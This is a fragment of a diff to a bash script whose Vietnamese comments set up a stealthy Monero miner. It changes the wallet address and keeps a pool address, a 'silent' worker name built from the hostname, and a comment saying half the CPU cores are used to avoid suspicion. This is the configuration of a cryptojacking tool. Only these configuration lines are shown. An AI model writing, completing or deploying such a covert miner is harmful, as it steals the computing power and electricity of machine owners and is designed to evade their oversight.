@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ======= Cấu hình =======
-WALLET="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
+WALLET="47xooGnFD6CLUExhWnGEhaLZwpfsAXRw47pqQcFNVc19FewwwvdEdB65CuL8DNXu5pXbsYfVxvQxg6UN6DgPnhaKS87pkEA"
 WORKER="silent_$(hostname)"
 POOL="pool.supportxmr.com:3333"
 CPU_THREADS=$(($(nproc) / 2)) # Dùng 50% số core để tránh bị nghi ngờ
